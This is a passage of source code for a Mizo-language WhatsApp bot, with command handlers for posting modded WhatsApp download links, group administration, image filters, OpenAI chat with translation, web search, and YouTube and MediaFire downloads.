​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​${othermenu(prefix)}`]
let ments = [ownernya, me, mark]       
let { key } = await HBWABotInc.sendMessage(from, {text: '《▒▒▒▒▒▒▒▒▒▒▒▒》0%\n♻️ _Nghak lawk rawh.._'},{quoted:m})

for (let i = 0; i < HBLoadingmenu.length; i++) {await HBWABotInc.sendMessage(from, {text: HBLoadingmenu[i], edit: key },{quoted:m})}
}
break

case 'gb': case 'gbwhatsapp': {
var hbmodspng = await getBuffer(`https://i.imgur.com/i5s0rnL.png`)
HBWABotInc.sendMessage(from, { 
text: ` *GBWhatsApp Latest Version*\nhttps://herbert70.blogspot.com/2022/04/download-gbwhatsapp-last-version-update.html\nDeveloped by HBMods Apk Store`,
contextInfo:{
        externalAdReply:{
showAdAttribution: true,
containsAutoReply: true, 
renderLargerThumbnail: false,
title: 'GBWhatsApp',
body: 'Latest Version',
thumbnail: fs.readFileSync("./HBMedia/HBMods/Gb.png"),
mediaType: 2, 
mediaUrl: `https://herbert70.blogspot.com/2022/04/download-gbwhatsapp-last-version-update.html`,
sourceUrl: `https://herbert70.blogspot.com/2022/04/download-gbwhatsapp-last-version-update.html`
}
}
},{quoted:m})
}
break 
case 'fm': case 'fmwhatsapp': { 
var hbmodspng = await getBuffer(`https://i.imgur.com/3RAYRjk.png`)
HBWABotInc.sendMessage(from, { 
text: ` *FMWhatsApp Latest Version*\nhttps://herbert70.blogspot.com/search/label/FMWhatsApp\nDeveloped by HBMods Apk Store`,
contextInfo:{
        externalAdReply:{ 
showAdAttribution: true,
containsAutoReply: true,
renderLargerThumbnail: false,
title: 'FMWhatsApp',
body: 'Latest Version',
thumbnail: fs.readFileSync("./HBMedia/HBMods/Fm.png"),
mediaType: 2,
mediaUrl: `https://herbert70.blogspot.com/search/label/FMWhatsApp`,
sourceUrl: `https://herbert70.blogspot.com/search/label/FMWhatsApp`
}
}
},{quoted:m})
}
break
case 'yo': case 'yowhatsapp': {
var hbmodspng = await getBuffer(`https://i.imgur.com/Y21MLL1.png `)
HBWABotInc.sendMessage(from, { 
text: ` *YOWhatsApp Latest Version*\nhttps://herbert70.blogspot.com/2022/10/yowhatsapp.html\nDeveloped by HBMods Apk Store`,
contextInfo:{
        externalAdReply:{ 
showAdAttribution: true,
containsAutoReply: true,
renderLargerThumbnail: false,           
title: 'YOWhatsApp',
body: 'Latest Version',
thumbnail: fs.readFileSync("./HBMedia/HBMods/Yo.png"), 
mediaType: 2,
mediaUrl: `https://herbert70.blogspot.com/2022/10/yowhatsapp.html`,
sourceUrl: `https://herbert70.blogspot.com/2022/10/yowhatsapp.html`
}
}
},{quoted:m})
}
break
case 'mb': case 'mbwhatsapp': { 
var hbmodspng = await getBuffer(`https://i.imgur.com/Uz0c4Dd.png `)
HBWABotInc.sendMessage(from, { 
text: ` *MBWhatsApp Latest Version*\nhttps://herbert70.blogspot.com/search/label/MBWhatsApp?m=1\nDeveloped by HBMods Apk Store`,
contextInfo:{
        externalAdReply:{
showAdAttribution: true,
containsAutoReply: true,
renderLargerThumbnail: false,       
title: 'MBWhatsApp',
body: 'Latest Version',
thumbnail: fs.readFileSync("./HBMedia/HBMods/Mb.png"),
mediaType: 2,
mediaUrl: `https://herbert70.blogspot.com/search/label/MBWhatsApp?m=1`,
sourceUrl: `https://herbert70.blogspot.com/search/label/MBWhatsApp?m=1`
}
}
},{quoted:m})
}
break
case 'hbmods': case 'fouad': case 'mod': case 'mods': { 
var hbmodspng = await getBuffer(`https://i.imgur.com/SfP3f4M.png `)
HBWABotInc.sendMessage(from, { 
text: ` *WhatsApp Fouad Mod Latest Version*\nhttps://herbert70.blogspot.com/search/label/FouadMods?m=1\nDeveloped by HBMods Apk Store`,
contextInfo:{
        externalAdReply:{ 
showAdAttribution: true,
containsAutoReply: true,
renderLargerThumbnail: false,      
title: 'WhatsApp Fouad Mod',
body: 'Latest Version',
thumbnail: fs.readFileSync("./HBMedia/HBMods/Fouad.png"),
mediaType: 2,
mediaUrl: `https://herbert70.blogspot.com/search/label/FouadMods?m=1`,
sourceUrl: `https://herbert70.blogspot.com/search/label/FouadMods?m=1`
}
}
},{quoted:m})
}
break
case 'join': {
if (!HerbertTheCreator) return m.reply(mess.owner)
if (!text) return replyherbertstyle(`Tiang hian tih tur: ${prefix+command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replyherbertstyle('Link a dik lo!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await HBWABotInc.groupAcceptInvite(result)
await replyherbertstyle(`Ka join tawh e....✓`)
}
break
case 'block': case 'ban': {
		if (!HerbertTheCreator) return m.reply(mess.owner)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await HBWABotInc.updateBlockStatus(users, 'block')
		await replyherbertstyle(`Block a ni e....✓`)
	}
	break
        case 'unblock': case 'unban': {
		if (!HerbertTheCreator) return m.reply(mess.owner)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await HBWABotInc.updateBlockStatus(users, 'unblock')
		await replyherbertstyle(`Zove....✓`)
	}
	break
case 'listblock': case 'listban': case 'blocklist': case 'banlist': {
	const lisben = "Total Block: " + banUser.length
	replyherbertstyle(lisben)
	}
	break
case 'delete': case 'del': {
                if (!m.quoted) throw false
                let { chat, fromMe, id, isBaileys } = m.quoted
                 HBWABotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
            case 'linkgroup': case 'linkgc': case 'gclink': case 'grouplink': {
                if (!m.isGroup) return m.reply(mess.group)
                if (!isBotAdmins) return m.reply(mess.botAdmin)
                let response = await HBWABotInc.groupInviteCode(m.chat)
                HBWABotInc.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nGroup Link : ${groupMetadata.subject}`, m, { detectLink: true })
            }
            break
case 'add': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await HBWABotInc.groupParticipantsUpdate(m.chat, [users], 'add')
await dodoi(`Done`)
}
break
case 'kick': {
if (!m.isGroup) return m.reply(mess.group)
if (!HerbertTheCreator) return m.reply(mess.owner)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await HBWABotInc.groupParticipantsUpdate(m.chat, [users], 'remove')
await replyherbertstyle(`He group a tang hian remove a ni....✓`)
}
break
case 'promote': {
if (!m.isGroup) return m.reply(mess.group)
if (!isAdmins && !HerbertTheCreator) return m.reply(mess.owner)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await HBWABotInc.groupParticipantsUpdate(m.chat, [users], 'promote')
await replyherbertstyle(`Zove....✓`)
}
break
case 'demote': {
if (!m.isGroup) return m.reply(mess.group)
if (!isAdmins && !HerbertTheCreator) return m.reply(mess.admin)
if (!isBotAdmins) return m.reply(mess.botAdmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await HBWABotInc.groupParticipantsUpdate(m.chat, [users], 'demote')
await replyherbertstyle(`Zove....✓`)
}
break
case 'hidetag': {
if (!m.isGroup) return m.reply(mess.group)
if (!isAdmins && !HerbertTheCreator) return m.reply(mess.admin)
if (!isBotAdmins) return m.reply(mess.botAdmin)
HBWABotInc.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break
case 'ebinary': {
if (!q) return replyherbertstyle(`Send/reply text with captions ${prefix + command}`)
await loading()
let { eBinary } = require('./scrape/binary')
let eb = await eBinary(`${q}`)
replyherbertstyle(eb)
}
break
case 'dbinary': {
if (!q) return replyherbertstyle(`Send/reply text with captions ${prefix + command}`)
await loading()
let { dBinary } = require('./scrape/binary')
let db = await dBinary(`${q}`)
replyherbertstyle(db)
}
break
case 'remini': {
			if (!quoted) return replyherbertstyle(`Thlalak rawn dah rawh`)
			if (!/image/.test(mime)) return replyherbertstyle(`Thlalak Send/Reply in a caption ah ${prefix + command} tih hi rawn dah rawh`)
			await loading()
			const { remini } = require('./lib/remini')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
			HBWABotInc.sendMessage(m.chat, { image: proses, caption: "\n*©HBWABot*"}, { quoted: m})
			
			}
			break
case 'toanime': case 'tocartoon': {
if (!quoted) return replyherbertstyle(`Thlalak rawn dah rawh`)
			if (!/image/.test(mime)) return replyherbertstyle(`Thlalak Send/Reply in a caption ah ${prefix + command} tih hi rawn dah rawh`)
			await loading()
            const { toanime } = require('betabotz-tools')
            let downloadrawh = await quoted.download()
            let results = await toanime(downloadrawh)
            console.log(results) //json
            HBWABotInc.sendMessage(m.chat, { image: {url: results.image_data}, caption: "\n*©HBWABot*"}, { quoted: m})
            
}
break
case 'removebg': case 'bgremove': {
if (!quoted) return replyherbertstyle(`Thlalak rawn dah rawh`)
			if (!/image/.test(mime)) return replyherbertstyle(`Thlalak Send/Reply in a caption ah ${prefix + command} tih hi rawn dah rawh`)
			await loading()
            const { removebg } = require('betabotz-tools')
            let downloadrawh = await quoted.download()
            let results = await removebg(downloadrawh)
            console.log(results) //json
            HBWABotInc.sendMessage(m.chat, { image: {url: results.image_data}, caption: "\n*©HBWABot*"}, { quoted: m})
            
}
break
case 'remini2': case 'hd': {
if (!quoted) return replyherbertstyle(`Thlalak rawn dah rawh`)
			if (!/image/.test(mime)) return replyherbertstyle(`Thlalak Send/Reply in a caption ah ${prefix + command} tih hi rawn dah rawh`)
			await loading()
            const { remini } = require('betabotz-tools')
            let downloadrawh = await quoted.download()
            let results = await remini(downloadrawh)
            console.log(results) //json
            HBWABotInc.sendMessage(m.chat, { image: {url: results.image_data}, caption: "\n*©HBWABot*"}, { quoted: m})
            
}
break

case 'tozombie': {
if (!quoted) return replyherbertstyle(`Thlalak rawn dah rawh`)
			if (!/image/.test(mime)) return replyherbertstyle(`Thlalak Send/Reply in a caption ah ${prefix + command} tih hi rawn dah rawh`)
			await loading()
            const { tozombie } = require('betabotz-tools')
            let downloadrawh = await quoted.download()
            let results = await tozombie(downloadrawh)
            console.log(results) //json
            HBWABotInc.sendMessage(m.chat, { image: {url: results.image_data}, caption: "\n*©HBWABot*"}, { quoted: m})
            
}
break 		

case 'ai': case 'openai': {
if (!text) return replyherbertstyle(`Ai nen a in biakna\n\nTiang hian i hmang ang:\n${prefix + command} Tunge mizoram chief minister?`)
await robotreact()
const { openai } = require('betabotz-tools') 
const source1 = 'auto'
const target1 = 'en'
const athu1 = `${text}`
const mizotranslation1 = await mizo_tawnga_translate_na.translate(source1, target1, athu1)
const heihi_ani = `${mizotranslation1}`
const heihian = await openai(`${heihi_ani}`)
console.log(heihian)//JSON
const chutin = `${heihian.result}`
const source = 'auto'
const target = 'lus'
const athu = `${chutin}`
const mizotranslation = await mizo_tawnga_translate_na.translate(source, target, athu)
await HBWABotInc.sendMessage(from, { text: mizotranslation }, { quoted: m })
}
  break
  
    //betabotz ChatBot
case 'ai2': case 'openai2': {
if (!text) return replyherbertstyle(`Ai nen a in biakna\n\nTiang hian i hmang ang:\n${prefix + command} Tunge mizoram chief minister?`)
await robotreact()
const { openai } = require('betabotz-tools') 
const source1 = 'auto'
const target1 = 'en'
const athu1 = `${text}`
const mizotranslation1 = await mizo_tawnga_translate_na.translate(source1, target1, athu1)
const heihi_ani = `${mizotranslation1}`
const heihian = await openai(`${heihi_ani}`)
console.log(heihian)//JSON
const chutin = `${heihian.result}`
const source = 'auto'
const target = 'en'
const athu = `${chutin}`
const mizotranslation = await mizo_tawnga_translate_na.translate(source, target, athu)
await HBWABotInc.sendMessage(from, { text: mizotranslation }, { quoted: m })
}
  break 
  case 'aix': case 'openaix':
try {
if (global.keyopenai === '') return replyherbertstyle("Api key limi exceeded");
if (!q) return dodoi(`Chat with AI.\n\nExample:\n${prefix + command} What is coding`)
const { Configuration, OpenAIApi } = require('openai')
const configuration = new Configuration({
apiKey: global.keyopenai,
});
const openai = new OpenAIApi(configuration);
const response = await openai.createCompletion({
model: "text-davinci-003",
prompt: q,
temperature: 0.3,
max_tokens: 2000,
top_p: 1.0,
frequency_penalty: 0.0,
presence_penalty: 0.0,
});
dodoi(`${response.data.choices[0].text}`);
} catch (error) {
if (error.response) {
console.log(error.response.status);
console.log(error.response.data);
console.log(`${error.response.status}\n\n${error.response.data}`);
} else {
console.log(error);
dodoi("Sorry, there seems to be an error :"+ error.message);
}
}
break
 case 'ai3': case 'openai3': {
 if (!q) return replyherbertstyle(`Ai nen a in biakna\n\nTiang hian i hmang ang:\n${prefix + command} Tunge mizoram chief minister?`)
  await robotreact();
  const apiKey = global.keyopenai;
  const apiEndpoint = 'https://api.openai.com/v1/engines/davinci/completions';
  const source = 'auto';
  const target = 'lus';
  const inputText = `${q}`;
  const mizotranslation = await mizo_tawnga_translate_na.translate(source, target, inputText);
    const prompt = `${mizotranslation}`;
    const requestData = {
      prompt: prompt,
      max_tokens: 2000,
    };
    const headers = {
      'Authorization': `Bearer ${apiKey}`,
      'Content-Type': 'application/json',
    };
    const response = await axios.post(apiEndpoint, requestData, { headers });
    const generatedText = response.data.choices[0].text;
    console.log('Generated Text:');
    console.log(generatedText);
    const source1 = 'auto';
    const target1 = 'lus';
    const generatedTranslation = await mizo_tawnga_translate_na.translate(source1, target1, generatedText);
    await HBWABotInc.sendMessage(from, { text: generatedTranslation }, { quoted: m });
}
break;

			case 'gimage': {
                if (!text) return replyherbertstyle(`Tiang hian tih tur : ${prefix + command} Mizoram`)
                await loading()
                let gis = require('g-i-s')
                gis(text, async (error, result) => {
                    n = result
                    images = n[Math.floor(Math.random() * n.length)].url
                    HBWABotInc.sendMessage(m.chat, { image: { url: images}, caption: `*-------「 GIMAGE SEARCH 」-------*\n🤠 *Query* : ${text}\n🔗 *Media Url* : ${images}`}, { quoted: m })
                    
                })
            }
            case 'gimage': {

       if (!text) return replyherbertstyle(`Tiang hian tih tur : ${prefix + command} Mizoram`
)
        herbertezyanu = await fetchJson(`https://api.akuari.my.id/search/googleimage?query=${text}`)

        n = herbertezyanu.result

        images = n[Math.floor(Math.random() * n.length)]


                HBWABotInc.sendMessage(m.chat, { image: { url: images}, caption: `*-------「 GIMAGE SEARCH 」-------*\n🤠 *Query* : ${text}\n🔗 *Media Url* : ${images}`}, { quoted: m })

        }

        break

			case 'mediafire': {
	if (args.length == 0) return replyherbertstyle(`A link rawn dah rawh..!`)
	if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return replyherbertstyle(`I link rawn dah hi a dik lo!..`)
	const { mediafireDl } = require('./lib/mediafire.js')
	const baby1 = await mediafireDl(text)
	if (baby1[0].size.split('MB')[0] >= 100) return replyherbertstyle('A file size a lian lutuk...')
	const result4 = `*MEDIAFIRE DOWNLOADER*

*❖ Name* : ${baby1[0].nama}
*❖ Size* : ${baby1[0].size}
*❖ Mime* : ${baby1[0].mime}
*❖ Link* : ${baby1[0].link}`
replyherbertstyle(`${result4}`)
HBWABotInc.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m })
}
break
case 'google': {
if (!q) return replyherbertstyle(`Tiang hian tih tur : ${prefix + command} ${botname}`)
await loading()
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `⭔ *Title* : ${g.title}\n`
teks += `⭔ *Description* : ${g.snippet}\n`
teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
replyherbertstyle(teks)
})

}
break
case 'yts': case 'hla':{
        if (!text) return m.reply(`\n*Entir nan* : ${prefix + command} Hringnun Vanlalsailova`)
            let ytslagu = require("youtube-yts")
            let lagusearch = await ytslagu(text)
            listSerch = []
            teskd = `*${text}*\nA hnuaia *H L A* tih khu hmet la i duh ber la chhuak rawh\n`
            for (let i of lagusearch.all) {
                listSerch.push({
                    title: i.title,
                    rowId: `${prefix}ytmp3 ${i.url}`,
                    description: `Duration: ${i.timestamp}`
                })
            }
            const sections = [
                {
                    title: " " + lagusearch.all.length + " hmuh a ni",
                    rows: listSerch
                }
            ]
            const listMessage = {
                text: teskd,
                title: ``,
                buttonText: "H L A",
                mentions: parseMention(teskd), sections
            }
            return HBWABotInc.sendMessage(m.chat, listMessage, {
                quoted: m
            })
            }
            break            
            case 'ytmp4xx': {
//Credit by HBMods-OFC
if (!args || !args[0]) return replyherbertstyle(`Tiang hian tih tur : ${prefix + command} https://youtube.com/watch?v=DA9gCKwaefg`)
await loadingreact()
if (!args[0].match(/youtu/gi)) replyherbertstyle ('Youtube link dik tak chauh rawn dah rawh')
let q = args[1] || '360p'
		let v = args[0]
		const yt = await youtubedl(v).catch(async () => await youtubedlv2(v))
		const dl_url = await yt.video[q].download()
		const title = await yt.title
		const size = await yt.video[q].fileSizeH 		
        const ytc=`*${title}*
┌──────────────
*⚙️File type :* mp4
*⚙️Quality :* ${q}
*⚙️Size :* ${size}
*⚙️By HBWABot Mizo*
└──────────────`
await uploadreact()
await HBWABotInc.sendMessage(m.chat,{
    video: {url: dl_url},
    caption: ytc
}, {quoted:m})
await finishreact()
}
            break  
            case 'ytmp4xxx': {
const herbertvideo = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !herbertvideo.isYTUrl(text)) return replyherbertstyle(`Tiang hian tih tur : ${prefix + command} https://youtube.com/watch?v=DA9gCKwaefg`)
const vid=await herbertvideo.mp4(text)
const ytc=`
*Tittle:* ${vid.title}
*Date:* ${vid.date}
*Duration:* ${vid.duration}
*Quality:* ${vid.quality}`
await HBWABotInc.sendMessage(m.chat,{
    video: {url:vid.videoUrl},
    caption: ytc
},{quoted:m})
}
break         
case 'ytmp3':{
//Credit by HBMods-OFC
if (!args || !args[0]) return replyherbertstyle(`Tiang hian tih tur : ${prefix + command} https://youtube.com/watch?v=DA9gCKwaefg`)
await loadingreact()
if (!args[0].match(/youtu/gi)) replyherbertstyle ('Youtube link dik tak chauh rawn dah rawh')
let q = '128kbps'
let v = args[0]
		const yt = await youtubedl(v).catch(async () => await youtubedlv2(v))
		const dl_url = await yt.audio[q].download()
		const title = await yt.title
		const size = await yt.audio[q].fileSizeH 
		const ytcp=`*${title}*
┌──────────────
*⚙️Quality :* ${q}
*⚙️Size :* ${size}
*⚙️By HBWABot Mizo*
└──────────────`
await uploadreact()
        HBWABotInc.sendMessage(m.chat, {document: {url: dl_url} ,mimetype: 'audio/mpeg', fileName: title+`.mp3`, caption: ytcp},{quoted:m})
await finishreact()
}
break
case 'ytaudio':{
//Credit by HBMods-OFC
if (!args || !args[0]) return replyherbertstyle(`Tiang hian tih tur : ${prefix + command} https://youtube.com/watch?v=DA9gCKwaefg`)
await loadingreact()
if (!args[0].match(/youtu/gi)) replyherbertstyle ('Youtube link dik tak chauh rawn dah rawh')
let q = '128kbps'
let v = args[0]
		const yt = await youtubedl(v).catch(async () => await youtubedlv2(v))
		const dl_url = await yt.audio[q].download()
		const title = await yt.title
		const size = await yt.audio[q].fileSizeH 
		await uploadreact()
        HBWABotInc.sendMessage(m.chat, {audio: {url: dl_url} ,mimetype: 'audio/mpeg', fileName: title+`.mp3`},{quoted:m})
await finishreact()
}
break 
case 'dsong2': case 'song2': case 'play2': {
//Credit by HBMods-OFC
if (!text) return replyherbertstyle(`Tiang hian tih tur : ${prefix + command} K hminga siar lalnu`)
            await loadingreact()
            let res = await yts2(text)
let vid = res.videos[0]
let q = isVideo ? '360p' : '128kbps'
let v = vid.url
let yt = await youtubedl(v).catch(async () => await youtubedlv2(v))
let dl_url = await (isVideo ? yt.video[q].download() : yt.audio[q].download())
let title = await yt.title
let size = await (isVideo ? yt.video[q].fileSizeH : yt.audio[q].fileSizeH)
await uploadreact()
HBWABotInc.sendMessage(m.chat, {audio: {url: dl_url} ,mimetype: 'audio/mpeg', fileName: vid.title+`.mp3`,},{quoted:m})
await finishreact()
}
break
    case 'dsong': case 'song': case 'play': {
//Credit by HBMods-OFC
if (!text) return replyherbertstyle(`Tiang hian tih tur : ${prefix + command} K hminga siar lalnu`)
            await loadingreact()
            let res = await yts2(text)
let vid = res.videos[0]
let q = isVideo ? '360p' : '128kbps'
let v = vid.url
let yt = await youtubedl(v).catch(async () => await youtubedlv2(v))
let dl_url = await (isVideo ? yt.video[q].download() : yt.audio[q].download())
let title = await yt.title
let size = await (isVideo ? yt.video[q].fileSizeH : yt.audio[q].fileSizeH)
await uploadreact()
HBWABotInc.sendMessage(m.chat, {document: {url: dl_url} ,mimetype: 'audio/mpeg', fileName: vid.title+`.mp3`, caption: `*${title}*

00:00 ───ㅇ───── ${vid.timestamp}
┌──────────────
*⚙️ Quality :* ${q}
*🕛 Duration :* ${vid.timestamp}
*👀 Viewers :* ${vid.views}
*♻️ Published :* ${vid.ago}
*💬 Url :* ${vid.url}
└──────────────`},{quoted:m})
await finishreact()
}
break
case '/hla':  case 'songxx': {
if (!text) return replyherbertstyle(`Tiang hian tih tur : ${prefix + command} K hminga siar lalnu`)
await loading()
const herbertplaymp3 = require('./lib/ytdl2')
let yts = require("youtube-yts")
        let search = await yts(text)
        let anup3k = search.videos[0]
const pl= await herbertplaymp3.mp3(anup3k.url)
await HBWABotInc.sendMessage(m.chat,{
    audio: fs.readFileSync(pl.path),
    fileName: anup3k.title + '.mp3',
    mimetype: 'audio/mp4',
    contextInfo:{
        externalAdReply:{
            title:anup3k.title,
            body: botname,
            thumbnail: await fetchBuffer(pl.meta.image),
            mediaType:2,
            mediaUrl:anup3k.url,
        }

    },
},{quoted:m})
await fs.unlinkSync(pl.path)

}
break 
case 'dsong3': {
if (!text) return replyherbertstyle(`Tiang hian tih tur : ${prefix + command} K hminga siar lalnu`)
await loading()
const herbertplaymp3 = require('./lib/ytdl2')
let yts = require("youtube-yts")
        let search = await yts(text)
        let anup3k = search.videos[0]
const pl= await herbertplaymp3.mp3(anup3k.url)
await HBWABotInc.sendMessage(m.chat,{document: fs.readFileSync(pl.path),
    fileName: anup3k.title + '.mp3',
    mimetype: 'audio/mp4',
    contextInfo:{
        externalAdReply:{
            title:anup3k.title,
            body: botname,
            thumbnail: await fetchBuffer(pl.meta.image),
            mediaType:2,
            mediaUrl:anup3k.url,
        }

    },
},{quoted:m})
await fs.unlinkSync(pl.path)

}
break
case "ytmp3xx": case "ytaudioxx": //credit: Ray Senpai â¤ï¸ https://github.com/EternityBots/Nezuko
const herbertaudp3 = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !herbertaudp3.isYTUrl(text)) return replyherbertstyle(`Youtube link rawn dah rawh\nTiang hian tih tur : ${prefix + command} https://youtube.com/watch?v=DA9gCKwaefg`)
await loading()
const audio=await herbertaudp3.mp3(text)
await HBWABotInc.sendMessage(m.chat,{
    audio: fs.readFileSync(audio.path),
    fileName: audio.meta.title + '.mp3',
    mimetype: 'audio/mp4',
    contextInfo:{
        externalAdReply:{
            title:audio.meta.title,
            body: botname,
            thumbnail: await fetchBuffer(audio.meta.image),
            mediaType:2,
            mediaUrl:text,
        }

    },
},{quoted:m})
await fs.unlinkSync(audio.path)

break
case 'ytmp4': case 'ytvideo': {
const herbertvidoh = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !herbertvidoh.isYTUrl(text)) replyherbertstyle(`Video link rawn dah rawh!!\n\nTiang hian tih tur : ${prefix + command} https://youtube.com/watch?v=DA9gCKwaefgs`)
await loading()
const vid=await herbertvidoh.mp4(text)
const ytc=`
*${themeemoji}Tittle:* ${vid.title}
*${themeemoji}Date:* ${vid.date}
*${themeemoji}Duration:* ${vid.duration}
*${themeemoji}Quality:* ${vid.quality}`
await HBWABotInc.sendMessage(m.chat,{
    video: {url:vid.videoUrl},
    caption: ytc
},{quoted:m})

}
break
case 'dvideo':  case 'dvid': {
if (!text) return replyherbertstyle(`Tiang hian tih tur : ${prefix + command} K hminga siar lalnu`)
await loadingreact()
const herbertvidoh = require('./lib/ytdl2')
let yts = require("youtube-yts")
        let search = await yts(text)
        let anup3k = search.videos[0]
const vid=await herbertvidoh.mp4(anup3k.url)
const ytc=`
*${themeemoji}Tittle:* ${vid.title}
*${themeemoji}Date:* ${vid.date}
*${themeemoji}Duration:* ${vid.duration}
*${themeemoji}Quality:* ${vid.quality}`
await uploadreact()
await HBWABotInc.sendMessage(m.chat,{
    video: {url:vid.videoUrl},
    caption: ytc
},{quoted:m})
await finishreact()
}
break
case 'addprem':
if (!HerbertTheCreator) return m.reply(mess.owner)
if (!args[0]) return replyherbertstyle(`Use ${prefix+command} number\nTiang hian tih tur :${prefix+command} 918416093656`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await HBWABotInc.onWhatsApp(prrkek)
if (ceknya.length == 0) return replyherbertstyle(`WhatsApp khawih te number chiah rawn dah rawh!!!`)
prem.push(prrkek)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
replyherbertstyle(`A number ${prrkek} hi premium a ni ta e`)
break
case 'delprem':
if (!HerbertTheCreator) return m.reply(mess.owner)
if (!args[0]) return replyherbertstyle(`Use ${prefix+command} number\nTiang hian tih tur :${prefix+command} 918416093656`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
replyherbertstyle(`A number ${ya} hi premium member a tang remove a ni!.`)
break
case 'addsticker':{
if (!HerbertTheCreator) return m.reply(mess.owner)
if (args.length < 1) return replyherbertstyle('Whats the sticker name?')
if (StickerHerbert.includes(q)) return replyherbertstyle("A hming a awm tawh")
let delb = await HBWABotInc.downloadAndSaveMediaMessage(quoted)
StickerHerbert.push(q)
await fsx.copy(delb, `./HBMedia/sticker/${q}.webp`)
fs.writeFileSync('./HBMedia/database/herbertsticker.json', JSON.stringify(StickerHerbert))
fs.unlinkSync(delb)
replyherbertstyle(`Add a ni ta\nCheck i check duh chuan tiang hian type rawh ${prefix}liststicker`)
}
break
case 'delsticker':{
if (!HerbertTheCreator) return m.reply(mess.owner)
if (args.length < 1) return replyherbertstyle('A sticker hming rawn dah rawh')
if (!StickerHerbert.includes(q)) return replyherbertstyle("Tiang hming hi database ah a awm lo tlat")
let wanu = StickerHerbert.indexOf(q)
StickerHerbert.splice(wanu, 1)
fs.writeFileSync('./HBMedia/database/herbertsticker.json', JSON.stringify(StickerHerbert))
fs.unlinkSync(`./HBMedia/sticker/${q}.webp`)
replyherbertstyle(`Delete a ni tawh e ${q}`)
}
break
case 'liststicker':{
let teks = '┌──⭓「 *Sticker List* 」\n│\n'
for (let x of StickerHerbert) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*A vaiin : ${StickerHerbert.length}*`
replyherbertstyle(teks)
}
break
case 'addvn':{
if (!HerbertTheCreator) return m.reply(mess.owner)
if (args.length < 1) return replyherbertstyle('Audio hming rawn dah rawh')
if (VoiceNoteHerbert.includes(q)) return replyherbertstyle("a hming a awm tawh!..")
let delb = await HBWABotInc.downloadAndSaveMediaMessage(quoted)
VoiceNoteHerbert.push(q)
await fsx.copy(delb, `./HBMedia/audio/${q}.mp3`)
fs.writeFileSync('./HBMedia/database/herbertvn.json', JSON.stringify(VoiceNoteHerbert))
fs.unlinkSync(delb)
replyherbertstyle(`Audio ah dah a ni e\nTiang hian type la i en thei ang ${prefix}listvn`)
}
break
case 'delvn':{
if (!HerbertTheCreator) return m.reply(mess.owner)
if (args.length < 1) return replyherbertstyle('Enter the vn name')
if (!VoiceNoteHerbert.includes(q)) return replyherbertstyle("Database ah chu tiang hming chu a awm lo")
let wanu = VoiceNoteHerbert.indexOf(q)
VoiceNoteHerbert.splice(wanu, 1)
fs.writeFileSync('./HBMedia/database/herbertvn.json', JSON.stringify(VoiceNoteHerbert))
fs.unlinkSync(`./HBMedia/audio/${q}.mp3`)
replyherbertstyle(`Delete a ni tawh e ${q}`)
}
break
case 'listvn':{
let teks = '┌──⭓「 *VN List* 」\n│\n'
for (let x of VoiceNoteHerbert) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*A vaiin : ${VoiceNoteHerbert.length}*`
replyherbertstyle(teks)
}
break 
case '/group': case '#group': {
if (!m.isGroup) return HBWAStickGroup()
if (!isAdmins && !HerbertTheCreator) return m.reply(mess.admin)
if (!isBotAdmins) return m.reply(mess.BotAdmin)
if (!q) return replyherbertstyle(`Group info i edit duh chuan option ang khuan ti ang che\n\n*Options : close & open*\nclose chu admin te chauh tawng theia dah na\nopen chu partisipants te tawng ve theia dahna \nEntirnan tiang hian i ti ang : ${command} close`)
if (args[0] == 'close') {
HBWABotInc.groupSettingUpdate(from, 'announcement')
replyherbertstyle(`He group hi Admin te chauh message thawn thei tura dah a ni e...✓`)
